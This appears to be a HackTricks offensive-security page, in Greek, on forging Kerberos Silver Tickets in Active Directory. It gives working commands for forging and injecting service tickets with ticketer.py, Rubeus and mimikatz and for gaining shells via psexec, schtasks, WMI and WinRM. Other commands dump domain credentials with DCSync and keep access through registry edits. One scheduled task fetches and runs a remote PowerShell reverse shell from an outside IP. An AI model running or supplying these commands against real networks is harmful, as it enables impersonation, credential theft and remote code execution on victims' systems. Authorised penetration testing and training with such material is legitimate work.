# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Η επίθεση **Silver Ticket** περιλαμβάνει την εκμετάλλευση υπηρεσιακών εισιτηρίων σε περιβάλλοντα Active Directory (AD). Αυτή η μέθοδος βασίζεται στην **απόκτηση του NTLM hash ενός λογαριασμού υπηρεσίας**, όπως ενός λογαριασμού υπολογιστή, για να κατασκευαστεί ένα Ticket Granting Service (TGS) ticket. Με αυτό το πλαστό εισιτήριο, ένας επιτιθέμενος μπορεί να έχει πρόσβαση σε συγκεκριμένες υπηρεσίες στο δίκτυο, **υποδυόμενος οποιονδήποτε χρήστη**, συνήθως στοχεύοντας σε διοικητικά δικαιώματα. Τονίζεται ότι η χρήση κλειδιών AES για την κατασκευή εισιτηρίων είναι πιο ασφαλής και λιγότερο ανιχνεύσιμη.

> [!WARNING]
> Τα Silver Tickets είναι λιγότερο ανιχνεύσιμα από τα Golden Tickets επειδή απαιτούν μόνο το **hash του λογαριασμού υπηρεσίας**, όχι τον λογαριασμό krbtgt. Ωστόσο, είναι περιορισμένα στην συγκεκριμένη υπηρεσία που στοχεύουν. Επιπλέον, απλώς κλέβοντας τον κωδικό πρόσβασης ενός χρήστη.
Επιπλέον, αν παραβιάσετε τον **κωδικό πρόσβασης ενός λογαριασμού με SPN** μπορείτε να χρησιμοποιήσετε αυτόν τον κωδικό πρόσβασης για να δημιουργήσετε ένα Silver Ticket υποδυόμενοι οποιονδήποτε χρήστη σε αυτή την υπηρεσία.

Για την κατασκευή εισιτηρίων, χρησιμοποιούνται διάφορα εργαλεία ανάλογα με το λειτουργικό σύστημα:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Στα Windows
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Η υπηρεσία CIFS επισημαίνεται ως κοινός στόχος για την πρόσβαση στο σύστημα αρχείων του θύματος, αλλά και άλλες υπηρεσίες όπως οι HOST και RPCSS μπορούν επίσης να εκμεταλλευτούν για εργασίες και ερωτήματα WMI.

## Διαθέσιμες Υπηρεσίες

| Τύπος Υπηρεσίας                            | Υπηρεσία Silver Tickets                                                   |
| ------------------------------------------ | ------------------------------------------------------------------------ |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Ανάλογα με το λειτουργικό σύστημα επίσης:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Σε ορισμένες περιπτώσεις μπορείτε απλώς να ζητήσετε: WINRM</p> |
| Προγραμματισμένα Καθήκοντα                | HOST                                                                   |
| Κοινή Χρήση Αρχείων Windows, επίσης psexec | CIFS                                                                   |
| Λειτουργίες LDAP, συμπεριλαμβανομένου του DCSync | LDAP                                                                   |
| Εργαλεία Διαχείρισης Απομακρυσμένου Διακομιστή Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                     |
| Χρυσά Εισιτήρια                            | krbtgt                                                                 |

Χρησιμοποιώντας **Rubeus** μπορείτε να **ζητήσετε όλα** αυτά τα εισιτήρια χρησιμοποιώντας την παράμετρο:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### IDs Εκδηλώσεων Silver tickets

- 4624: Σύνδεση Λογαριασμού
- 4634: Αποσύνδεση Λογαριασμού
- 4672: Σύνδεση Διαχειριστή

## Επιμονή

Για να αποφευχθεί η περιστροφή του κωδικού πρόσβασης των μηχανών κάθε 30 ημέρες, ρυθμίστε `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ή μπορείτε να ρυθμίσετε `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` σε μεγαλύτερη τιμή από 30 ημέρες για να υποδείξετε την περίοδο περιστροφής κατά την οποία θα πρέπει να περιστραφεί ο κωδικός πρόσβασης της μηχανής.

## Κατάχρηση Εισιτηρίων Υπηρεσίας

Στα παρακάτω παραδείγματα ας φανταστούμε ότι το εισιτήριο ανακτάται υποδυόμενοι τον λογαριασμό διαχειριστή.

### CIFS

Με αυτό το εισιτήριο θα μπορείτε να έχετε πρόσβαση στους φακέλους `C$` και `ADMIN$` μέσω **SMB** (αν είναι εκτεθειμένοι) και να αντιγράψετε αρχεία σε ένα μέρος του απομακρυσμένου συστήματος αρχείων απλά κάνοντας κάτι όπως:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Θα μπορείτε επίσης να αποκτήσετε ένα shell μέσα στον υπολογιστή ή να εκτελέσετε αυθαίρετες εντολές χρησιμοποιώντας **psexec**:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Με αυτή την άδεια μπορείτε να δημιουργήσετε προγραμματισμένα καθήκοντα σε απομακρυσμένους υπολογιστές και να εκτελέσετε αυθαίρετες εντολές:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Με αυτά τα εισιτήρια μπορείτε να **εκτελέσετε WMI στο σύστημα του θύματος**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Βρείτε **περισσότερες πληροφορίες σχετικά με το wmiexec** στην παρακάτω σελίδα:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Με πρόσβαση winrm σε έναν υπολογιστή μπορείτε να **έχετε πρόσβαση σε αυτόν** και ακόμη και να αποκτήσετε ένα PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Δείτε την παρακάτω σελίδα για να μάθετε **περισσότερους τρόπους σύνδεσης με έναν απομακρυσμένο υπολογιστή χρησιμοποιώντας winrm**:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Σημειώστε ότι **το winrm πρέπει να είναι ενεργό και να ακούει** στον απομακρυσμένο υπολογιστή για να έχετε πρόσβαση σε αυτόν.

### LDAP

Με αυτό το προνόμιο μπορείτε να εξάγετε τη βάση δεδομένων του DC χρησιμοποιώντας **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Μάθετε περισσότερα για το DCSync** στην παρακάτω σελίδα:

{{#ref}}
dcsync.md
{{#endref}}


## Αναφορές

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)



{{#include ../../banners/hacktricks-training.md}}
